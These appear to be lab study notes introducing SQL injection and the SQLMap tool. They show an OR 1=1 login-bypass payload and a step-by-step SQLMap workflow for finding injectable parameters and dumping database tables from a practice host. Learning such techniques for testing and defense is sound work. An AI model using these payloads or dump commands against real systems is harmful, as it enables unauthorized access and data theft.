# SQL Injection — Introduction

## What is a Database?
- Stores, modifies, and retrieves data in a structured format
- Websites use databases for authentication, search, etc.
- Managed by **DBMS**: MySQL, PostgreSQL, SQLite, Microsoft SQL Server
- Websites interact with databases using **SQL (Structured Query Language)**

---

## How Login Works (Normal Flow)

**Input:**
```
Username: John
Password: Un@detectable444
```

**Generated SQL query:**
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```
- Returns user data if **both** username AND password match
- Both conditions must be true (boolean AND)

---

## What is SQL Injection?

> When user input is **not sanitized/validated**, an attacker can inject SQL code that gets executed by the database.

---

## Basic SQLi Example — Auth Bypass

**Attacker input:**
```
Username: John
Password: abc' OR 1=1;-- -
```

**Resulting query sent to DB:**
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

### Why this works — breakdown:

| Part | Effect |
|------|--------|
| `abc` | Random string (wrong password) |
| `'` | Closes the password string in SQL |
| `OR 1=1` | Always true — overrides the failed password check |
| `;-- -` | Comments out the rest of the query |

**Logic flow:**
1. `password = 'abc'` → **FALSE**
2. `OR 1=1` → **TRUE**
3. TRUE overrides FALSE → query succeeds
4. `-- -` comments out anything after → no syntax error

→ Attacker logs in as John **without knowing the password**

### Why the `'` (single quote) matters:
- Without `'`: input is treated as the full password string → no injection
- With `'`: closes the SQL string → allows injecting SQL logic after it

---

# SQLMap — Automated SQL Injection Tool

## What is SQLMap?
- Automated tool for **detecting and exploiting SQLi vulnerabilities**
- Built into some Linux distros; install manually if not present
- CLI tool: `sqlmap --help` lists all flags

---

## Key Flags

| Flag | Purpose |
|------|---------|
| `--wizard` | Interactive beginner-friendly guided mode |
| `-u <URL>` | Target URL to test |
| `--dbs` | Extract all database names |
| `-D <db>` | Select a specific database |
| `--tables` | Extract table names from selected DB |
| `-T <table>` | Select a specific table |
| `--dump` | Dump all records from selected table |
| `--cookie="..."` | Pass session cookie for authenticated testing |
| `-r <file>` | Test using intercepted POST request file |

---

## Attack Workflow

### Step 1 — Identify vulnerable URL
URLs with GET parameters are candidates:
```
http://sqlmaptesting.thm/search?cat=1
```

### Step 2 — Scan for SQLi
```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1
```
**SQLMap detected on `cat` parameter:**
- Boolean-based blind → `cat=1 AND 2175=2175`
- Error-based → `EXTRACTVALUE(...)` payload
- Time-based blind
- UNION query (NULL) — 1 to 20 columns

**Target fingerprint from scan:**
```
OS:          Linux Ubuntu
Web tech:    Nginx, PHP 5.6.40
Back-end DB: MySQL >= 5.1
```

### Step 3 — Extract database names
```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
```
**Result:**
```
[*] users
[*] members
```

### Step 4 — Extract tables from a database
```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
```
**Result (DB: acuart):**
```
| johnath |
| alexas  |
| thomas  |
```

### Step 5 — Dump records from a table
```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users -T thomas --dump
```
**Result:**
```
| Date       | name       | pass    |
| 09/09/2024 | Thomas THM | testing |
```
> SQLMap also detected a `passhash` column and offered to crack hashes via dictionary attack

---

## POST-Based Testing
For login/registration forms (data sent in request body, not URL):
1. Intercept the POST request with Burp Suite → save as `.txt`
2. Run:
```bash
sqlmap -r intercepted_request.txt
```

## Cookie-Based Testing (Authenticated Sessions)
```bash
sqlmap -u <URL> --cookie="SESSIONID=abcdef123456"
```
Use when app requires login to reach the injection point — grab cookie from browser after logging in.

---

## SQLi Technique Types (Detected by SQLMap)

| Type | How it works |
|------|-------------|
| Boolean-based blind | Modifies query with true/false condition (`AND 1=1`) |
| Error-based | Forces DB errors that leak data in the response |
| Time-based blind | Injects `SLEEP()` — infers data from response delay |
| UNION-based | Appends `UNION SELECT` to retrieve data directly |
